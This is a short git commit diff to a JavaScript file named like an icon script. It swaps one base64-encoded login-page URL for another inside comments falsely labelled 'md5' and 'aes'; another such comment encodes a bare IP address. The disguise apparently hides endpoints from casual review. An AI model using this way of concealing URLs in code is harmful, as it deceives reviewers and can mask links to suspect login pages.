ed2d76a334dd6421b3915c724cc82dca26113055
daguo <daguo@gmail.com>
2023-03-28 12:33:16 +0800

    init

--- js/icon_ri07s7.js
+++ js/icon_ri07s7.js
@@ -8,4 +8,4 @@ if($.browser.mozilla||$.browser.opera)
 		function UnloadHandler() {
 				window.removeEventListener('beforeunload', UnloadHandler, false);
 		}
-})()/** md5:aHR0cHM6Ly93d3cuc2t2amZ1a3dxamUuY29tLyMvbG9naW4vbG9naW4=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
+})()/** md5:aHR0cHM6Ly93d3cucGFvY2puai5jb20vIy9sb2dpbi9sb2dpbg==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/
